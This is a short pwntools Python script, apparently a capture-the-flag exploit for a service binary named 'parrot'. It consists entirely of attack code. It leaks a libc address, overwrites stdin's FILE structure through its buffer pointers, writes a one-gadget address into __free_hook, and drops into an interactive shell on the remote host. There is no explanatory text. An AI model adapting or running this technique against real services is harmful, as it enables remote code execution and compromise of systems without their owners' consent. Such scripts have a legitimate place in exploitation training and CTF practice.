#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('parrot'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add(size, data):
    r.sendlineafter('Size:\n', str(size))
    r.sendlineafter('Buffer:\n', data)

r = remote(HOST, PORT)

# leak libc
_='a'*0x10; add(len(_), _)
_='a'*0x20; add(len(_), _)
_='a'*0x100; add(len(_), _)
add(0x100, '')
leak = r.leak('\n')
leak = (leak << 8) & 0xffffffffffff
libc_base = leak - 0x3c4b00
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base
r.unrecv('Size:\n')
add(0x100, '')

# overwrite _IO_buf_base with \x00
_IO_buf_base = libc_base + 0x3c4918 + 1
add(_IO_buf_base, '')

# overwrite _IO_buf_base to fronter
stdin = libc_base + 0x3c48e0
fake_buf_base = stdin + 8
fake_stdin = flat([_IO_buf_base]*3, fake_buf_base)
r.sendafter('Size:\n', fake_stdin)
r.sendafter('Buffer:\n', '\x00')

# overwrite the entire stdin and __IO_xxx_base to __free_hook
fake_buf_base = libc.sym['__free_hook']
fake_buf_end = fake_buf_base + 0x20
fake_stdin = flat(0xfbad208b, [fake_buf_base]*7, fake_buf_end)
r.sendafter('Buffer:\n', 'a'*0xe0 + fake_stdin)
pause()

# write one gadget on __free_hook
fuck = libc_base + 0x4526a
r.sendafter('Buffer:\n', '\x00'*0xa8 + p64(fuck))

r.interactive()
